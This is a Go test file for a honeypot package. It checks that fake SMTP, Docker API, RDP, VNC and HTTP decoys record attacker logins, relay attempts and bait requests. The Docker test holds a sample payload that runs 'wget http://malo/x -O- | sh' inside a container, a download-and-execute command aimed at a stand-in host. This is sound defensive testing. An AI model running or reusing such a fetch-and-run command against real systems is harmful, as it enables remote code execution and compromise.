package trampa

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/k0braintheworld/k0pot/internal/model"
)

func TestSMTPCapturaCredenciales(t *testing.T) {
	dir, rec := arrancar(t, &SMTP{})
	c, _ := net.Dial("tcp", dir)
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))
	r := bufio.NewReader(c)

	r.ReadString('\n') // 220
	fmt.Fprint(c, "EHLO probador\r\n")
	r.ReadString('\n')
	r.ReadString('\n')
	r.ReadString('\n')
	fmt.Fprint(c, "AUTH LOGIN\r\n")
	r.ReadString('\n') // 334 Username
	fmt.Fprintf(c, "%s\r\n", base64.StdEncoding.EncodeToString([]byte("admin")))
	r.ReadString('\n') // 334 Password
	fmt.Fprintf(c, "%s\r\n", base64.StdEncoding.EncodeToString([]byte("hunter2")))

	ev, ok := rec.esperar(model.LoginFallido, time.Second)
	if !ok {
		t.Fatal("no se registro el login")
	}
	if ev.Detalle["usuario"] != "admin" || ev.Detalle["password"] != "hunter2" {
		t.Fatalf("credenciales = %q / %q", ev.Detalle["usuario"], ev.Detalle["password"])
	}
}

func TestSMTPRelay(t *testing.T) {
	dir, rec := arrancar(t, &SMTP{})
	c, _ := net.Dial("tcp", dir)
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))
	r := bufio.NewReader(c)

	r.ReadString('\n')
	fmt.Fprint(c, "HELO x\r\n")
	r.ReadString('\n')
	fmt.Fprint(c, "MAIL FROM:<spam@fuera.com>\r\n")
	r.ReadString('\n')
	fmt.Fprint(c, "RCPT TO:<victima@ajeno.com>\r\n")

	ev, ok := rec.esperar(model.ComandoEjecutado, time.Second)
	if !ok {
		t.Fatal("no se registro el relay")
	}
	if ev.Detalle["comando"] == "" || ev.Detalle["comando"][:4] != "RCPT" {
		t.Fatalf("comando = %q", ev.Detalle["comando"])
	}
}

func TestDockerCreaContenedor(t *testing.T) {
	dir, rec := arrancar(t, &Docker{})
	c, _ := net.Dial("tcp", dir)
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))

	cuerpo := `{"Image":"alpine","Cmd":["sh","-c","wget http://malo/x -O- | sh"]}`
	fmt.Fprintf(c, "POST /v1.43/containers/create HTTP/1.1\r\nHost: x\r\n"+
		"Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s",
		len(cuerpo), cuerpo)

	ev, ok := rec.esperar(model.ComandoEjecutado, time.Second)
	if !ok {
		t.Fatal("no se registro la creacion del contenedor")
	}
	cmd := ev.Detalle["comando"]
	if !contiene(cmd, "image=alpine") || !contiene(cmd, "wget http://malo") {
		t.Fatalf("comando = %q", cmd)
	}
}

func TestRDPCapturaMstshash(t *testing.T) {
	dir, rec := arrancar(t, &RDP{})
	c, _ := net.Dial("tcp", dir)
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))

	// TPKT + carga con el cookie mstshash.
	datos := "Cookie: mstshash=administrator\r\n"
	total := 4 + len(datos)
	paquete := []byte{0x03, 0x00, byte(total >> 8), byte(total)}
	paquete = append(paquete, []byte(datos)...)
	c.Write(paquete)

	ev, ok := rec.esperar(model.LoginFallido, time.Second)
	if !ok {
		t.Fatal("no se registro el usuario RDP")
	}
	if ev.Detalle["usuario"] != "administrator" {
		t.Fatalf("usuario = %q", ev.Detalle["usuario"])
	}
}

func TestVNCConexion(t *testing.T) {
	dir, rec := arrancar(t, &VNC{})
	c, _ := net.Dial("tcp", dir)
	defer c.Close()
	c.SetDeadline(time.Now().Add(2 * time.Second))

	saludo := make([]byte, 12)
	if _, err := readFull(c, saludo); err != nil {
		t.Fatal(err)
	}
	if string(saludo) != "RFB 003.008\n" {
		t.Fatalf("saludo VNC = %q", saludo)
	}
	c.Write([]byte("RFB 003.008\n"))

	ev, ok := rec.esperarDetalle(model.Conexion, "cliente", time.Second)
	if !ok {
		t.Fatal("no se registro la conexion VNC con version de cliente")
	}
	if ev.Detalle["cliente"] != "RFB 003.008" {
		t.Fatalf("cliente = %q", ev.Detalle["cliente"])
	}
}

func contiene(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestHTTPMuerdeElCebo comprueba las dos mitades de la trampa con cebo: que
// sirve contenido falso creible en una ruta jugosa, y que captura las
// credenciales que se envian al panel falso por POST.
func TestHTTPMuerdeElCebo(t *testing.T) {
	dir, rec := arrancar(t, &HTTP{})

	// 1) GET a /.env: debe devolver el fichero de entorno falso y marcar cebo.
	c, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	io.WriteString(c, "GET /.env HTTP/1.0\r\nHost: x\r\n\r\n")
	resp, _ := io.ReadAll(c)
	c.Close()
	if !strings.Contains(string(resp), "DB_PASSWORD") {
		t.Fatalf("el .env falso no trae credenciales de cebo: %q", resp)
	}
	ev, ok := rec.esperar(model.PeticionHTTP, time.Second)
	if !ok || ev.Detalle["cebo"] == "" {
		t.Fatalf("no se marco el cebo en el evento: %+v", ev.Detalle)
	}

	// 2) POST al panel falso: debe capturar usuario y clave.
	c2, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	cuerpo := "username=root&password=hunter2"
	fmt.Fprintf(c2, "POST /wp-login.php HTTP/1.0\r\nHost: x\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: %d\r\n\r\n%s", len(cuerpo), cuerpo)
	io.ReadAll(c2)
	c2.Close()

	fin := time.Now().Add(time.Second)
	var capturado bool
	for time.Now().Before(fin) && !capturado {
		rec.mu.Lock()
		for _, e := range rec.eventos {
			if e.Detalle["usuario"] == "root" && e.Detalle["password"] == "hunter2" {
				capturado = true
			}
		}
		rec.mu.Unlock()
		time.Sleep(10 * time.Millisecond)
	}
	if !capturado {
		t.Fatal("no se capturaron las credenciales enviadas al panel falso")
	}
}
